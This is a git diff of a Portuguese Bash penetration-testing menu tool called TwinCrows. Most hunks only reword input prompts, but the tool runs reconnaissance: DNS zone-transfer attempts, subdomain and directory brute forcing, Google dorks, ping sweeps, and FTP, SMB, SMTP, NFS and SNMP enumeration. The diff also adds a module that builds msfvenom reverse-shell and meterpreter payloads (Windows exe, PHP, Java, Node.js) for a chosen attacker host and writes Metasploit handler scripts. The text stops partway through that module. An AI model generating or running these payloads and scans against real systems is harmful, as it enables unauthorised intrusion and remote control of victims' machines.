@@ -30,8 +30,8 @@ tc_html_parsing() {
 	centralizado "${azulbold}===== HTML parsing =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz um parsing no codigo html da pagina informada e extrai todos os links encontrados e seus respectivos IPs de servidor.${normal}"
 	echo
-	echo -e "${verde}Informe o dominio:${normalbold}"
-	read -p '>> ' dominio
+	printf "${verde}Informe o dominio: ${normalbold}"
+	read dominio
 	echo
         centralizado "${azulbold}=====RESULTADO======${normal}\n"
 	echo
@@ -50,8 +50,8 @@ tc_html_parsing() {
 	cat $dominio.txt
 	rm -f $dominio.txt
 	echo -e "\n"
-	echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-        read -p '>> ' opcao
+	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_html_parsing
@@ -65,14 +65,14 @@ tc_whois() {
 	centralizado "${azulbold}===== whois =====\n\n${normal}"
         echo -e "${cinza}Este modulo executa uma pesquisa de whois no dominio informado, as informacoes entregues podem ser usadas para obter mais informacoes."
         echo
-        echo -e "${verde}Digite o dominio ou IP:${normalbold}"
-        read  -p '>> ' dominio
+        printf "${verde}Digite o dominio ou IP: ${normalbold}"
+        read dominio
         echo
         centralizado "${azulbold}=====RESULTADO======${normal}\n"
         echo
         whois $dominio
-	echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-	read -p '>> ' opcao
+	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+	read opcao
 	if [ "$opcao" == "s" ]
 	then
 		tc_whois
@@ -85,8 +85,8 @@ tc_map_dom() {
 	centralizado "${azulbold}===== Mapeamento de dominio =====\n\n${normal}"
 	echo -e "${cinza}Este modulo traz informacoes valiosas sobre as configuracoes do servidor, como enderecos de IP, servidores de DNS, servidores de e-mail, configuracoes, alem de fazer uma tentativa de transferencia de zona, estas informacoes podem ser usadas em ataques posteriores."
 	echo
-	echo -e "${verde}Informe o dominio:${normalbold}"
-	read -p '>> ' dominio
+	printf "${verde}Informe o dominio: ${normalbold}"
+	read dominio
 	echo -e "\n"
 	centralizado "${azulbold}===== RESULTADO =====${normal}\n"
 	echo -e "\n\n${amarelo}---- Endereco IPv4 ------------------------------------${normal}\n"
@@ -106,8 +106,8 @@ tc_map_dom() {
 	do
 		host -l $dominio $dns
 	done
-	echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]:${normalbold}"
-        read -p '>> ' opcao
+	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_map_dom
@@ -121,15 +121,15 @@ tc_bf_subd() {
 	centralizado "${azulbold}===== Bruteforce de subdominio =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz um bruteforce para encontrar subdominios listados, o TwinCrows vem com uma wordlist padrao, porem uma outra pode ser fornecida."
 	echo
-	echo -e "${verde}Informe o dominio:${normalbold}"
-	read -p '>> ' dominio
+	printf "${verde}Informe o dominio: ${normalbold}"
+	read dominio
 	echo -e "\n"
-	echo -e "${verde}Deseja informar uma wordlist?[s/n]${normalbold}"
-	read -n2 -p '>> ' opcao
+	printf "${verde}Deseja informar uma wordlist? [s/n]: ${normalbold}"
+	read opcao
 	if [ "$opcao" == "s" ]
 	then
-		echo -e "${verde}Informe o caminho da wordlist:${normalbold}"
-		read -p '>> ' wlsubdominio
+		printf "${verde}Informe o caminho da wordlist: ${normalbold}"
+		read wlsubdominio
 	fi
 	echo -e "\n"
 	centralizado "${azulbold}Mapeando os subdominios, aguarde...${normal}\n"
@@ -151,12 +151,12 @@ tc_dns_rev() {
 	centralizado "${azulbold}===== DNS Reverso =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz uma pesquisa reversa, a partir de um range de IP coletado em modulos anteriores, e possivel fazer uma pesquisa e revelar qual deles tem um dominio associado."
 	echo
-	echo -e "${verde}Informe o IP da rede Ex 37.59.174.226:${normalbold}"
-	read -p '>> ' ip
+	printf "${verde}Informe o IP da rede Ex 37.59.174.226: ${normalbold}"
+	read ip
 	echo $ip > ip
 	echo
-        echo -e "${verde}Digite o intervalo do netrange Ex: 220 226${normalbold}"
-	read -p '>> ' intervalo
+        printf "${verde}Digite o intervalo do netrange Ex: 220 226: ${normalbold}"
+	read intervalo
 	echo
 	centralizado "${azulbold}===== RESULTADO =====${normal}\n"
         echo -e "\n"
@@ -171,16 +171,14 @@ tc_dns_rev() {
 		fi
 	done
 	rm -f ip
-	echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]:${normalbold}"
-        read -p '>> ' opcao
+	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_dns_rev
         else
                 exec $1
         fi
-
-
 }
 
 tc_dirsearch() {
@@ -188,22 +186,22 @@ tc_dirsearch() {
 	centralizado "${azulbold}===== Dirsearch =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz um bruteforce de diretorios na pagina web, utiliza de uma wordlist que o TwinCrows fornece, ou permite utilizacao de outra. Alem de diretorios, este modulo tambem faz pesquisa por extensoes de paginas, como php, asp, html... Afim de encontrar paginas acessiveis. Este modulo tambem permite o uso da rede Tor para anonimizacao das pesquisas."
 	echo
-	echo -e "${verde}Informe o dominio:${normalbold}"
-        read -p '>> ' dominio
+	printf "${verde}Informe o dominio: ${normalbold}"
+        read dominio
         echo
-	echo -e "${verde}Informe uma extensao ex(php) ou pressione enter para não pesquisar por arquivos:${normalbold}"
-	read -p '>> ' extensao
+	printf "${verde}Informe uma extensao ex(php) ou pressione enter para não pesquisar por arquivos: ${normalbold}"
+	read extensao
 	echo
-	echo -e "${verde}Deseja informar uma wordlist?[s/n]${normalbold}"
-        read -n2 -p '>> ' opcao
+	printf "${verde}Deseja informar uma wordlist? [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
-                echo -e "${verde}Informe o caminho da wordlist:${normalbold}"
-                read -p '>> ' wldiretorio
+                printf "${verde}Informe o caminho da wordlist: ${normalbold}"
+                read wldiretorio
         fi
 	echo
-	echo -e "${verde}Deseja utilizar o Tor como proxy?[s/n]:${normalbold}"
-	read -n2 -p '>> ' optprox
+	printf "${verde}Deseja utilizar o Tor como proxy? [s/n]: ${normalbold}"
+	read optprox
 	if [ "$optprox" == "s" ]
 	then
 		service tor restart
@@ -219,15 +217,15 @@ tc_whatweb() {
 	centralizado "${azulbold}===== Whatweb =====\n\n${normal}"
 	echo -e "${cinza}Este modulo executa o whatweb e enumera informacoes detalhadas sobre o servidor, paginas e tecnologias utilizadas na pagina."
 	echo
-	echo -e "${verde}Informe o dominio:${normalbold}"
-	read -p '>> ' dominio
+	printf "${verde}Informe o dominio: ${normalbold}"
+	read dominio
 	echo
 	centralizado "${azulbold}===== RESULTADO =====${normal}\n"
 	echo
 	whatweb -v $dominio -U "TwinCrows"
 	rm -f ip
-        echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]:${normalbold}"
-        read -p '>> ' opcao
+        printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_whatweb
@@ -240,11 +238,11 @@ tc_pagesearch() {
 	centralizado "${azulbold}===== Pagesearch =====\n\n${normal}"
 	echo -e "${cinza}Este modulo utiliza uma google dork para enumerar paginas de um website de acordo com a extensao pesquisada, ex php,asp, html."
 	echo
-	echo -e "${verde}Informe o dominio:${normalbold}"
-        read -p '>> ' dominio
+	printf "${verde}Informe o dominio: ${normalbold}"
+        read dominio
         echo
-	echo -e "${verde}Informe a extensão da pagina ex(php):${normalbold}"
-	read -p '>> ' extensao
+	printf "${verde}Informe a extensão da pagina ex(php): ${normalbold}"
+	read extensao
 	echo
         centralizado "${azulbold}===== RESULTADO =====${normal}\n"
         echo
@@ -256,8 +254,8 @@ tc_pagesearch() {
 		lynx -dump "http://google.com/search?num=500&q=site:"$dominio"+ext:"$extensao"" | cut -d "=" -f2 | grep ".$extensao" | egrep -v "site|google" | sed s'/...$//'g
 		echo -e "\n"
 	fi
-	echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]:${normalbold}"
-        read -p '>> ' opcao
+	printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_pagesearch
@@ -271,12 +269,12 @@ tc_pingsweep() {
 	centralizado "${azulbold}===== PingSweep =====\n\n${normal}"
 	echo -e "${cinza}Este modulo realiza um ping sweep em um intervalo de IPs e retorna quais estao ativos na rede."
 	echo
-	echo -e "${verde}Informe o IP da rede Ex 37.59.174.226:${normalbold}"
-        read -p '>> ' ip
+	printf "${verde}Informe o IP da rede Ex 37.59.174.226: ${normalbold}"
+        read ip
         echo $ip > ip
         echo
-        echo -e "${verde}Digite o intervalo do netrange Ex: 220 226${normalbold}"
-        read -p '>> ' intervalo
+        printf "${verde}Digite o intervalo do netrange Ex: 220 226: ${normalbold}"
+        read intervalo
         echo
         centralizado "${azulbold}===== RESULTADO =====${normal}\n"
         echo
@@ -285,8 +283,8 @@ tc_pingsweep() {
         for range in $(seq $intervalo);do ping -c 1 $prefixo.$range -w 1| grep "64 bytes" | cut -d " " -f4 | sed s'/.$//'g
 	done
 	rm -f ip
-	echo -e "${verdebold}\n\nDeseja efetuar um novo pingsweep? [s/n]:${normalbold}"
-        read -p '>> ' opcao
+	printf "${verdebold}\n\nDeseja efetuar um novo pingsweep? [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_pingsweep
@@ -299,18 +297,18 @@ tc_mt_wl() {
 	centralizado "${azulbold}===== Mutacao de Wordlist =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz uma mutacao de palavras chave para explorar suas variacoes, quanto maior a lista de palavras chave, maior sera o resultado final."
 	echo
-	echo -e "${verde}Informe o caminho da wordlist base:${normalbold}"
-	read -p '>> ' wl
+	printf "${verde}Informe o caminho da wordlist base: ${normalbold}"
+	read wl
 	echo -e "\n"
-	echo -e "${verde}Informe o nome para o arquivo de saida da wordlist mutada:${normalbold}"
-	read -p '>> ' nome
+	printf "${verde}Informe o nome para o arquivo de saida da wordlist mutada: ${normalbold}"
+	read nome
 	echo -e "\n\n"
 	python3 $TCScripts/wlmutacao.py $wl $TCWordlists/$nome
 	echo -e "\n"
 	echo -e "Arquivo salvo em $TCWordlists/$nome"
 	echo
-	echo -e "${verdebold}\n\nDeseja efetuar uma nova mutacao de wordlist? [s/n]:${normalbold}"
-        read -p '>> ' opcao
+	printf "${verdebold}\n\nDeseja efetuar uma nova mutacao de wordlist? [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_mt_wl
@@ -325,14 +323,14 @@ tc_metadados() {
 	centralizado "${azulbold}===== Analise de metadados =====\n\n${normal}"
 	echo -e "${cinza}Este modulo faz uma pesquisa utilizando dorks para encontrar arquivos disponiveis em uma pagina, ao encontralos, faz o download no diretorio informado e em seguida faz a analise de seus metadados."
 	echo
-	echo -e "${verde}Informe o dominio para a pesquisa:${normalbold}"
-	read -p '>> ' dominio
+	printf "${verde}Informe o dominio para a pesquisa: ${normalbold}"
+	read dominio
 	echo -e '\n'
-	echo -e "${verde}Informe a extensao para pesquisa de arquivo ex pdf, txt ou xlsx:${normalbold}"
-	read -p '>> ' arquivo
+	printf "${verde}Informe a extensao para pesquisa de arquivo ex pdf, txt ou xlsx: ${normalbold}"
+	read arquivo
 	echo -e '\n'
-	echo -e "${verde}Informe o caminho para salvar os arquivos baixados:${normalbold}"
-	read -p '>> ' caminho
+	printf "${verde}Informe o caminho para salvar os arquivos baixados: ${normalbold}"
+	read caminho
 	echo -e '\n'
 	lynx --dump "https://google.com/search?&q=site:"$dominio"+ext:"$arquivo"" | grep ".$arquivo" | cut -d "=" -f2 | egrep -v "google|site" | sed 's/...$//' > arquivos
 	if [ $(cat arquivos | wc -l) == 0 ]
@@ -347,8 +345,8 @@ tc_metadados() {
 	fi
 	rm -f arquivos
 	echo
-        echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-        read -p '>> ' opcao
+        printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+        read opcao
         if [ "$opcao" == "s" ]
         then
                 tc_metadados
@@ -369,7 +367,8 @@ tc_enumeration() {
 	do
 
         echo
-        echo -e "${verde}1 - FTP Enumeration"
+	echo -e "${verde}"
+        echo -e "1 - FTP Enumeration"
 	echo -e "2 - NetBIOS/SMB Enumeration"
 	echo -e "3 - SMTP Enumeration e bruteforce"
 	echo -e "4 - NSE Enumeration"
@@ -378,8 +377,8 @@ tc_enumeration() {
         echo -e "0 - voltar${normal}"
 
         echo -e "${normalbold}"
-
-        read  -p '>> ' opcao
+	printf $nvl2
+        read -p ' ' opcao
 
         echo
 
@@ -389,41 +388,41 @@ tc_enumeration() {
 			centralizado "${azulbold}===== Enumeracao de FTP =====\n\n${normal}"
 			echo -e "${cinza}Este modulo faz uma conexao com o servidor ftp alvo e captura seu banner, logo em seguida faz a tentativa de login com um usuario informado e executa um comando."
 			echo
-			echo -e "${verde}Informe o IP do servidor ftp alvo:${normalbold}"
-			read -p '>> ' ip
-			echo -e "${verde}Informe a porta, caso seja diferente de 21:${normalbold}"
-			read -p '>> ' ftpport
+			printf "${verde}Informe o IP do servidor ftp alvo: ${normalbold}"
+			read ip
+			printf "${verde}Informe a porta, caso seja diferente de 21: ${normalbold}"
+			read ftpport
 			if [ "$ftpport" == "" ]
 			then
 				ftpport=21
 			fi
-			echo -e "${verde}Informe um usuario para tentativa de login (default: anonymous):${normalbold}"
-			read -p '>> ' ftpuser
+			printf "${verde}Informe um usuario para tentativa de login (default: anonymous): ${normalbold}"
+			read ftpuser
 			if [ "$ftpuser" == "" ]
 			then
 				ftpuser="anonymous"
 			fi
-			echo -e "${verde}Informe uma senha para tentativa de login (default: anonymous):${normalbold}"
-			read -p '>> ' ftppass
+			printf "${verde}Informe uma senha para tentativa de login (default: anonymous): ${normalbold}"
+			read ftppass
 			if [ "$ftppass" == "" ]
 			then
 				ftppass="anonymous"
 			fi
-			echo -e "${verde}Informe um comando para rodar apos o login (default: pwd):${normalbold}"
-			read -p '>> ' ftpcmd
+			printf "${verde}Informe um comando para rodar apos o login (default: pwd): ${normalbold}"
+			read ftpcmd
 			if [ "$ftpcmd" == "" ]
 			then
 				ftpcmd="pwd"
 			fi
 			echo -e '\n'
 			python $TCScripts/enumftp.py $ip $ftpport $ftpuser $ftppass $ftpcmd
-			echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-        		read -p '>> ' opcao
+			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+        		read opcao
         		if [ "$opcao" == "s" ]
         		then
                 		tc_enumeration
         		else
-                		exec $TCPath/TwinCrows.sh
+                		exec $TCPath/TwinCrows
         		fi
 		;;
 
@@ -431,18 +430,18 @@ tc_enumeration() {
 			centralizado "${azulbold}===== Enumeracao de NetBIOS/SMB =====\n\n${normal}"
 			echo -e "${cinza}Este modulo utiliza o enum4linux para fazer uma varredura nos servicos de NetBIOS/SMB e tras informacoes importantes caso seja possivel."
 			echo
-			echo -e "${verde}Informe o IP do servidor alvo:${normalbold}"
-			read -p '>> ' ip
+			printf "${verde}Informe o IP do servidor alvo: ${normalbold}"
+			read ip
 			centralizado "${azulbold}===== RESULTADO =====${normal}\n"
         		echo
 			enum4linux -a $ip
-			echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-                        read -p '>> ' opcao
+			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+                        read opcao
                         if [ "$opcao" == "s" ]
                         then
                                 tc_enumeration
                         else
-                                exec $TCPath/TwinCrows.sh
+                                exec $TCPath/TwinCrows
                         fi
 		;;
 
@@ -450,16 +449,16 @@ tc_enumeration() {
 			centralizado "${azulbold}===== Enumeracao e bruteforce de SMTP =====\n\n${normal}"
 			echo -e "${cinza}Este modulo faz a enumeracao do servico de SMTP na porta 25 e faz bruteforce para encontrar usuarios validos utilizando o comando VRFY, nem todos os servicos tem esta vulnerabilidade. o TwinCrows tem uma wordlist padrao, mas uma nova pode ser informada."
 			echo
-			echo -e "${verde}Informe o IP do servidor alvo:${normalbold}"
-			read -p '>> ' ip
-			echo -e "${verde}Informe a porta caso seja diferente de 25, ou pressione enter:${normalbold}"
-			read -p '>> ' porta
+			printf "${verde}Informe o IP do servidor alvo: ${normalbold}"
+			read ip
+			printf "${verde}Informe a porta caso seja diferente de 25, ou pressione enter: ${normalbold}"
+			read porta
 			if [ "$porta" == "" ]
 			then
 				porta=25
 			fi
-			echo -e "${verde}Informe o caminho de uma wordlist ou pressione enter para usar a padrao:${normalbold}"
-			read -p '>> ' wl
+			printf "${verde}Informe o caminho de uma wordlist ou pressione enter para usar a padrao: ${normalbold}"
+			read wl
 			if [ "$wl" == "" ]
 			then
 				wl=$TCWordlists/usernames.txt
@@ -467,13 +466,13 @@ tc_enumeration() {
 			centralizado "${azulbold}===== RESULTADO =====${normal}\n"
         		echo
 			python $TCScripts/enumsmtp.py $ip $porta $wl
-			echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-                        read -p '>> ' opcao
+			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+                        read opcao
                         if [ "$opcao" == "s" ]
                         then
                                 tc_enumeration
                         else
-                                exec $TCPath/TwinCrows.sh
+                                exec $TCPath/TwinCrows
                         fi
 		;;
 		4)
@@ -482,10 +481,10 @@ tc_enumeration() {
 			centralizado "${azulbold}===== Enumeracao de NSE =====\n\n${normal}"
 			echo -e "${cinza}Este modulo faz a enumeracao do servico de NSE, e se vulneravel, faz a montagem do diretorio compartilhado com seus respectivos acessos."
 			echo
-			echo -e "${verde}Informe o IP do servidor alvo:${normalbold}"
-			read -p '>> ' ip
-			echo -e "${verde}Informe a porta caso seja diferente de 2049, ou pressione enter:${normalbold}"
-			read -p '>> ' porta
+			printf "${verde}Informe o IP do servidor alvo: ${normalbold}"
+			read ip
+			printf "${verde}Informe a porta caso seja diferente de 2049, ou pressione enter: ${normalbold}"
+			read porta
 			if [ "$porta" == "" ]
 			then
 				porta=2049
@@ -502,13 +501,13 @@ tc_enumeration() {
 			mount -t nfs -o nfsvers=$vernfs $ip:$dirnfs /tmp/tcnfs
 			echo -e "\n${azulbold}Diretorio montado em /tmp/tcnfs Rodando comando ls -la${normal}"
 			ls -la /tmp/tcnfs
-			echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-                        read -p '>> ' opcao
+			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+                        read opcao
                         if [ "$opcao" == "s" ]
                         then
                                 tc_enumeration
                         else
-                                exec $TCPath/TwinCrows.sh
+                                exec $TCPath/TwinCrows
                         fi
 
 		;;
@@ -516,10 +515,10 @@ tc_enumeration() {
 			centralizado "${azulbold}===== Enumeracao de SNMP =====\n\n${normal}"
 			echo -e "${cinza}Este modulo faz a enumeracao do servico de SNMP, e se vulneravel, faz a montagem do diretorio compartilhado com seus respectivos acessos."
 			echo
-			echo -e "${verde}Informe o IP do host alvo:${normalbold}"
-			read -p '>> ' ip
-			echo -e "${verde}Informe o caminho para uma wordlist de communities ou pressione enter para usar a padrao:${normalbold}"
-			read -p '>> ' wl
+			printf "${verde}Informe o IP do host alvo: ${normalbold}"
+			read ip
+			printf "${verde}Informe o caminho para uma wordlist de communities ou pressione enter para usar a padrao: ${normalbold}"
+			read wl
 			echo -e "${azul}Procurando por communities...${normal}\n"
 			if [ "$wl" == "" ]
 			then
@@ -528,24 +527,24 @@ tc_enumeration() {
 			onesixtyone -c $wl $ip | cut -d " " -f1,2 | grep -v "Scanning"
 			while [ "$com" == "" ]
 			do
-				echo -e "\n${verde}Qual comunnubity deseja utilizar?${normalbold}"
-				read -p '>> ' com
+				printf "\n${verde}Qual community deseja utilizar? ${normalbold}"
+				read com
 			done
 			xterm -title "SNMPWALK" -hold -geometry 96x120+0+0 -e snmpwalk -c $com -v1 $ip &
 			echo -e "\n${azul}Executando checagem de SNMP, pode demorar um pouco...${normal}\n"
 			snmp-check $ip -c $com
-			echo -e "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]:${normalbold}"
-                        read -p '>> ' opcao
+			printf "${verdebold}\n\nDeseja efetuar uma nova pesquisa? [s/n]: ${normalbold}"
+                        read opcao
                         if [ "$opcao" == "s" ]
                         then
                                 tc_enumeration
                         else
-                                exec $TCPath/TwinCrows.sh
+                                exec $TCPath/TwinCrows
                         fi
 
 		;;
 		0)
-			exec $TCPath/TwinCrows.sh
+			exec $TCPath/TwinCrows
 		;;
 		*)
 	                echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
@@ -558,7 +557,362 @@ tc_enumeration() {
 
 }
 
+tc_payload() {
+	tc_banner
 
+	centralizado "${azulbold}===== MSFVENOM PAYLOADS =====\n\n${normal}"
+	echo -e "${cinza}Este modulo utiliza o msfvenom para criar payloads executaveis. Tambem cria um rc para automatizar o uso dos exploits no metasploit.${normal}"
+
+	while :
+	do
+
+        echo
+	echo -e "${verde}"
+        echo -e "1 - Windows"
+	echo -e "2 - WEB"
+	echo -e "3 - Linux"
+#	echo -e "4 - Android"
+        echo
+        echo -e "0 - voltar${normal}"
+
+        echo -e "${normalbold}"
+	printf $nvl2
+        read -p ' ' opcao
+
+        echo
+
+        case $opcao in
+
+		1)
+			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}Windows${vermbold}]\n└─────►${normal}"
+			centralizado "${azulbold}===== Windows Payloads =====\n\n${normal}"
+			echo -e "${cinza}Escolha uma das opcoes."
+
+			while :
+			do
+
+			echo -e "${verde}"
+			echo -e "1 - windows/x64/meterpreter/reverse_tcp"
+			echo -e "2 - windows/meterpreter/reverse_tcp"
+			echo
+			echo -e "0 - Voltar"
+
+			echo -e "${normal}"
+			printf $nvl3
+			read -p ' ' opcao3
+
+			echo
+
+			case $opcao3 in
+				"1")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: programa.exe: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_x64_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_x64_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"2")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: programa.exe: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/win_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/win_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"0")
+					tc_payload
+				;;
+				*)
+		                        echo -e "${vermbold}OPÇÃO INVÁLIDA!!\n\n${normal}"
+                		 ;;
+
+
+			esac
+
+			done
+		;;
+
+		2)
+			nvl3="${vermbold}┌─[${azulbold}Twin${normalbold}\xE2\x98\xA0${azulbold}Crows${vermbold}]──[${azulbold}Payloads${vermbold}]──[${azulbold}WEB${vermbold}]\n└─────►${normal}"
+			centralizado "${azulbold}===== WEB Payloads =====\n\n${normal}"
+			echo -e "${cinza}Escolha uma das opcoes."
+
+			while :
+			do
+
+			echo -e "${verde}"
+			echo -e "1 - php/meterpreter/reverse_tcp"
+			echo -e "2 - java/meterpreter/reverse_tcp"
+			echo -e "3 - nodejs/shell_reverse_tcp"
+			echo -e "4 - firefox/shell_reverse_tcp "
+			echo
+			echo -e "0 - Voltar"
+
+			echo -e "${normal}"
+			printf $nvl3
+			read -p ' ' opcao3
+
+			echo
+
+			case $opcao3 in
+				"1")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: pagina.php: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/php_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload php/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/php_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"2")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.jar: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/java_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload java/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/java_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p java/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f jar -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"3")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
+					read nome
+					printf "${verde}Deseja criar um rc para executar com metasploit -r? [s/n]: ${normalbold}"
+					read rc
+					if [ "$rc" == "s" ]
+					then
+						echo -e "${azulbold}\nO rc sera salvo em $TCPayloads/js_payload.rc${normal}"
+						echo -e "use exploit/multi/handler\nset payload nodejs/shell_reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > $TCPayloads/js_payload.rc
+					fi
+					echo -e "${azulbold}\nPayload sendo gerado, aguarde...\n${normal}"
+					msfvenom -p nodejs/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw -o $TCPayloads/$nome
+					echo -e "${azulbold}\nPayload salvo em $TCPayloads/$nome"
+					printf "${verdebold}\n\nDeseja criar um novo payload? [s/n]: ${normalbold}"
+                		        read opcao
+                        		if [ "$opcao" == "s" ]
+                        		then
+                                		tc_payload
+                        		else
+                                		exec $TCPath/TwinCrows
+                        		fi
+				;;
+				"4")
+					echo -e "${verde}"
+					printf "Informe o LHOST: ${normalbold}"
+					read lhost
+					printf "${verde}Informe o LPORT: ${normalbold}"
+					read lport
+					printf "${verde}Informe o nome para o payload com extensao ex: arquivo.js: ${normalbold}"
+					read nome
